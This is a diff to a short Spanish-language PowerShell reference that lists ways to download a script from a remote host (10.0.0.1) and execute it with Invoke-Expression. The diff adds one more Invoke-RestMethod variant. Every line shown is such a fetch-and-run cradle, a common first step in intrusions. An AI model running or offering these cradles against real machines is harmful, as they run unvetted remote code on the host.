@@ -1,4 +1,4 @@
-# Ejemplos de uso Invoke-Expression en Invoke-WebRequest y WebClient
+# Ejemplos de uso Invoke-Expression en Invoke-WebRequest, Invoke-RestMethod y WebClient
 
 # Versiones Powershell
 PS > $PSVersionTable
@@ -14,6 +14,7 @@ PS > IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/sysinfo.txt'
 # Powershell v3.0 y superiores
 PS > Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | IEX
 PS > Invoke-RestMethod -Method Get -Uri 'http://10.0.0.1/sysinfo.txt' | IEX
+PS > IEX (Invoke-RestMethod -Method Get -Uri 'http://10.0.0.1/sysinfo.txt')
 PS > IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing)
 PS > Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | Select-Object Content | IEX
 PS > IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing).Content
